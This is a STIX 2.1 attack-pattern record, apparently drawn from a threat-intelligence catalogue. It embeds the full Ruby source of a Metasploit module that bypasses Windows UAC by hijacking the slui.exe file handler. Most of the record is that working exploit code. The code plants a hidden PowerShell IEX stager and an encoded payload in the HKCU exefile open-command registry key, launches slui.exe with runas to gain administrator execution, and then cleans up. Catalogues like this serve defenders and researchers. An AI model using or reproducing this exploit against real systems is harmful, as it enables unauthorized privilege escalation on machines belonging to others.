{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--76425525-61a2-44b1-9baa-1d0f8eef5bf1",
    "created": "2024-08-14T16:49:07.206209Z",
    "modified": "2024-08-14T16:49:07.206213Z",
    "name": "Windows UAC Protection Bypass (Via Slui File Handler Hijack)",
    "description": " This module will bypass UAC on Windows 8-10 by hijacking a special key in the Registry under the Current User hive, and inserting a custom command that will get invoked when any binary (.exe) application is launched. But slui.exe is an auto-elevated binary that is vulnerable to file handler hijacking. When we run slui.exe with changed Registry key (HKCU:\\Software\\Classes\\exefile\\shell\\open\\command), it will run our custom command as Admin instead of slui.exe.  The module modifies the registry in order for this exploit to work. The modification is reverted once the exploitation attempt has finished.  The module does not require the architecture of the payload to match the OS. If specifying EXE::Custom your DLL should call ExitProcess() after starting the payload in a different process.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_sluihijack.rb",
            "external_id": "bypassuac_sluihijack.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bytecode-77/slui-file-handler-hijack-privilege-escalation"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/gushmazuko/WinBypass/blob/master/SluiHijackBypass.ps1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Exploit::Powershell\n  include Post::Windows::Priv\n  include Post::Windows::Registry\n  include Post::Windows::Runas\n\n  SLUI_DEL_KEY = 'HKCU\\\\Software\\\\Classes\\\\exefile'.freeze\n  SLUI_WRITE_KEY = 'HKCU\\\\Software\\\\Classes\\\\exefile\\\\shell\\\\open\\\\command'.freeze\n  EXEC_REG_DELEGATE_VAL = 'DelegateExecute'.freeze\n  EXEC_REG_VAL = ''.freeze # This maps to \"(Default)\"\n  EXEC_REG_VAL_TYPE = 'REG_SZ'.freeze\n  SLUI_PATH = '%WINDIR%\\\\System32\\\\slui.exe'.freeze\n  CMD_MAX_LEN = 16383\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows UAC Protection Bypass (Via Slui File Handler Hijack)',\n        'Description' => %q{\n          This module will bypass UAC on Windows 8-10 by hijacking a special key in the Registry under\n          the Current User hive, and inserting a custom command that will get invoked when any binary\n          (.exe) application is launched. But slui.exe is an auto-elevated binary that is vulnerable\n          to file handler hijacking. When we run slui.exe with changed Registry key\n          (HKCU:\\Software\\Classes\\exefile\\shell\\open\\command), it will run our custom command as Admin\n          instead of slui.exe.\n\n          The module modifies the registry in order for this exploit to work. The modification is\n          reverted once the exploitation attempt has finished.\n\n          The module does not require the architecture of the payload to match the OS. If\n          specifying EXE::Custom your DLL should call ExitProcess() after starting the\n          payload in a different process.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'bytecode-77', # UAC bypass discovery and research\n          'gushmazuko', # MSF & PowerShell module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          ['Windows x86', { 'Arch' => ARCH_X86 }],\n          ['Windows x64', { 'Arch' => ARCH_X64 }]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          ['URL', 'https://github.com/bytecode-77/slui-file-handler-hijack-privilege-escalation'],\n          ['URL', 'https://github.com/gushmazuko/WinBypass/blob/master/SluiHijackBypass.ps1']\n        ],\n        'DisclosureDate' => '2018-01-15',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    version = get_version_info\n    if version.build_number.between?(Msf::WindowsVersion::Win8, Msf::WindowsVersion::Win10_1909)\n      CheckCode::Appears\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    # Validate that we can actually do things before we bother\n    # doing any more work\n    check_permissions!\n\n    commspec = 'powershell'\n    registry_view = REGISTRY_VIEW_NATIVE\n    psh_path = '%WINDIR%\\\\System32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe'\n\n    # Make sure we have a sane payload configuration\n    if sysinfo['Architecture'] == ARCH_X64\n      if session.arch == ARCH_X86\n        # On x64, check arch\n        commspec = '%WINDIR%\\\\Sysnative\\\\cmd.exe /c powershell'\n        if target_arch.first == ARCH_X64\n          # We can't use absolute path here as\n          # %WINDIR%\\\\System32 is always converted into %WINDIR%\\\\SysWOW64 from a x86 session\n          psh_path = 'powershell.exe'\n        end\n      end\n      if target_arch.first == ARCH_X86\n        # Invoking x86, so switch to SysWOW64\n        psh_path = '%WINDIR%\\\\SysWOW64\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe'\n      end\n    elsif target_arch.first == ARCH_X64\n      # if we're on x86, we can't handle x64 payloads\n      fail_with(Failure::BadConfig, 'x64 Target Selected for x86 System')\n    end\n\n    if !payload.arch.empty? && (payload.arch.first != target_arch.first)\n      fail_with(Failure::BadConfig, 'payload and target should use the same architecture')\n    end\n\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    payload_value = rand_text_alpha(8)\n    psh_path = expand_path(psh_path)\n\n    template_path = Rex::Powershell::Templates::TEMPLATE_DIR\n    psh_payload = Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload.encoded)\n\n    if psh_payload.length > CMD_MAX_LEN\n      fail_with(Failure::None, \"Payload size should be smaller then #{CMD_MAX_LEN} (actual size: #{psh_payload.length})\")\n    end\n\n    psh_stager = \"\\\"IEX (Get-ItemProperty -Path #{SLUI_WRITE_KEY.gsub('HKCU', 'HKCU:')} -Name #{payload_value}).#{payload_value}\\\"\"\n    cmd = \"#{psh_path} -nop -w hidden -c #{psh_stager}\"\n\n    existing = registry_getvaldata(SLUI_WRITE_KEY, EXEC_REG_VAL, registry_view) || ''\n    exist_delegate = !registry_getvaldata(SLUI_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view).nil?\n\n    if existing.empty?\n      registry_createkey(SLUI_WRITE_KEY, registry_view)\n    end\n\n    print_status('Configuring payload and stager registry keys ...')\n    unless exist_delegate\n      registry_setvaldata(SLUI_WRITE_KEY, EXEC_REG_DELEGATE_VAL, '', EXEC_REG_VAL_TYPE, registry_view)\n    end\n\n    registry_setvaldata(SLUI_WRITE_KEY, EXEC_REG_VAL, cmd, EXEC_REG_VAL_TYPE, registry_view)\n    registry_setvaldata(SLUI_WRITE_KEY, payload_value, psh_payload, EXEC_REG_VAL_TYPE, registry_view)\n\n    # Calling slui.exe through cmd.exe allow us to launch it from either x86 or x64 session arch.\n    cmd_path = expand_path(commspec)\n    cmd_args = expand_path(\"Start-Process #{SLUI_PATH} -Verb runas\")\n    print_status(\"Executing payload: #{cmd_path} #{cmd_args}\")\n\n    # We can't use cmd_exec here because it blocks, waiting for a result.\n    client.sys.process.execute(cmd_path, cmd_args, 'Hidden' => true)\n\n    # Wait a copule of seconds to give the payload a chance to fire before cleaning up\n    # TODO: fix this up to use something smarter than a timeout?\n    sleep(3)\n\n    handler(client)\n\n    print_status('Cleaning up ...')\n    unless exist_delegate\n      registry_deleteval(SLUI_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view)\n    end\n    if existing.empty?\n      registry_deletekey(SLUI_DEL_KEY, registry_view)\n    else\n      registry_setvaldata(SLUI_WRITE_KEY, EXEC_REG_VAL, existing, EXEC_REG_VAL_TYPE, registry_view)\n    end\n    registry_deleteval(SLUI_WRITE_KEY, payload_value, registry_view)\n  end\n\n  def check_permissions!\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n    # Check if you are an admin\n    # is_in_admin_group can be nil, true, or false\n    print_status('UAC is Enabled, checking level...')\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-01-15",
    "x_mitre_platforms": [
        "['win']"
    ]
}